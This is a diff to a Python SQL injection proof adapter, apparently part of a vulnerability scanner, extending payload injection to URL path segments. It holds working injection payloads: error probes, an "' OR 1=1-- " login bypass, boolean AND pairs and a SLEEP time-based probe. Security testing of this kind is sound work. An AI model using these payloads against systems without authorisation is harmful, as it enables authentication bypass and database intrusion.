@@ -10,6 +10,7 @@ import math
 import re
 import time
 from typing import Any, Mapping, Sequence
+from functools import partial
 import urllib.parse
 try:
     from capabilities.secret_material import keyed_body_digest
@@ -23,6 +24,7 @@ try:
         replace_private_request_field,
     )
     from capabilities.sql_error_signatures import SQL_ERROR_PATTERNS
+    from capabilities.sqli_path_mutation import prepare_path_candidate, path_field_value, replace_path_field
     from hunt.capability_executor import CapabilityAdapterResult, Cancelled, Heartbeat
     from runtime.capability_registry import CapabilitySpec
     from runtime.models import TargetBinding
@@ -34,6 +36,7 @@ except ModuleNotFoundError:
         replace_private_request_field,
     )
     from .sql_error_signatures import SQL_ERROR_PATTERNS
+    from .sqli_path_mutation import prepare_path_candidate, path_field_value, replace_path_field
     from ..hunt.capability_executor import CapabilityAdapterResult, Cancelled, Heartbeat
     from ..runtime.capability_registry import CapabilitySpec
     from ..runtime.models import TargetBinding
@@ -94,7 +97,9 @@ def _replace_query_field(
     )))
 
 
-def _field_value(request: ReplayRequest, field_path: str) -> str:
+def _field_value(request: ReplayRequest, field_path: str, path_index: int | None = None) -> str:
+    if path_index is not None:
+        return path_field_value(request, path_index)
     parsed = urllib.parse.urlsplit(request.url)
     values = [value for name, value in urllib.parse.parse_qsl(
         parsed.query, keep_blank_values=True,
@@ -104,7 +109,9 @@ def _field_value(request: ReplayRequest, field_path: str) -> str:
     return ""
 
 
-def _mutate(request: ReplayRequest, field_path: str, replacement: str) -> ReplayRequest:
+def _mutate(request: ReplayRequest, field_path: str, replacement: str, *, path_index: int | None = None) -> ReplayRequest:
+    if path_index is not None:
+        return replace_path_field(request, path_index, replacement)
     if request.method in {"GET", "HEAD", "OPTIONS"}:
         return _replace_query_field(request, field_path=field_path, replacement=replacement)
     try:
@@ -190,7 +197,11 @@ class SQLiProofAdapter:
             raise SQLiProofError("SQLi proof candidate has no exact field")
         self.specification = specification
         self.target = target
-        self.request = request
+        try:
+            self.request, self.path_index = prepare_path_candidate(request, candidate)
+        except ValueError as exc:
+            raise SQLiProofError(str(exc)) from exc
+        self.mutate = partial(_mutate, path_index=self.path_index)
         self.candidate = dict(candidate)
         self.transport = transport
         self.requested_budget = {str(k): int(v) for k, v in requested_budget.items()}
@@ -225,14 +236,14 @@ class SQLiProofAdapter:
             await heartbeat()
             return result
 
-        original = _field_value(self.request, self.field)
+        original = _field_value(self.request, self.field, self.path_index)
         invalid = f"shakerscan_invalid_{str(self.candidate.get('candidate_id') or '')[:12]}"
         request_class = str(self.candidate.get("request_class") or "safe_read")
         control_request = (
-            _mutate(self.request, self.field, invalid)
+            self.mutate(self.request, self.field, invalid)
             if request_class == "safe_authentication" else self.request
         )
-        error_request = _mutate(self.request, self.field, f"{original}'")
+        error_request = self.mutate(self.request, self.field, f"{original}'")
         try:
             pairs = [(await send(control_request), await send(error_request)) for _ in range(2)]
             control_signatures = [set(_signatures(control)) for control, _payload in pairs]
@@ -248,7 +259,7 @@ class SQLiProofAdapter:
                 proof_contract = "sqli_error_differential/v2"
                 technique = "error_based_repeated"
             elif request_class == "safe_authentication" and budget - attempted >= 4:
-                injection = _mutate(self.request, self.field, "' OR 1=1-- ")
+                injection = self.mutate(self.request, self.field, "' OR 1=1-- ")
                 auth_pairs = [(await send(control_request), await send(injection)) for _ in range(2)]
                 # A successful token assertion must be absent from the invalid
                 # control and present on the bypass payload. A cookie alone cannot
@@ -272,8 +283,8 @@ class SQLiProofAdapter:
             elif request_class != "safe_authentication" and budget - attempted >= 4:
                 true_payload = f"{original}' AND '1'='1"
                 false_payload = f"{original}' AND '1'='2"
-                true_request = _mutate(self.request, self.field, true_payload)
-                false_request = _mutate(self.request, self.field, false_payload)
+                true_request = self.mutate(self.request, self.field, true_payload)
+                false_request = self.mutate(self.request, self.field, false_payload)
                 boolean_pairs = [(await send(true_request), await send(false_request)) for _ in range(2)]
                 # A boolean differential requires the TRUE payload to reproduce the
                 # control (baseline) response and the FALSE payload to diverge from
@@ -312,7 +323,7 @@ class SQLiProofAdapter:
                         self.candidate.get("time_payload")
                         or f"{original}' AND SLEEP(1)-- "
                     )
-                    delay_request = _mutate(
+                    delay_request = self.mutate(
                         self.request, self.field, time_payload,
                     )
                     timing_pairs = [
